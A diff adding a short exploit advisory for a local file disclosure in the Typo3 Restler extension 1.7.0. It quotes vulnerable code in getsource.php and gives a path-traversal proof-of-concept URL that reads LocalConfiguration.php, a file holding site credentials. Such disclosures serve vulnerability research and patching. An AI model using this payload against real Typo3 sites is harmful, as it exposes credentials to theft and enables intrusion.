@@ -1,0 +1,28 @@
+# Exploit Title: Typo3 Restler Extension - Local File Disclosure
+# Date: 2017-10-13
+# Exploit Author: CrashBandicot @dosperl
+# Vendor Homepage: https://www.aoe.com/
+# Software Link: https://extensions.typo3.org/extension/restler/
+# Tested on : MsWin
+# Version: 1.7.0 (last)
+
+
+# Vulnerability File : getsource.php
+
+3.      $file = $_GET['file'];
+13.        $text = file_get_contents($file);
+16.      die($file . '<pre id="php">' . htmlspecialchars($text) . "</pre>");
+
+
+# PoC : 
+# http://vuln.site/typo3conf/ext/restler/vendor/luracast/restler/public/examples/resources/getsource.php?file=../../../../../../../LocalConfiguration.php
+
+# https://i.imgur.com/zObmaDD.png
+
+
+# Timeline :
+
+# Vulnerability identified
+# Vendor notified
+# CVE number requested
+# Exploit released
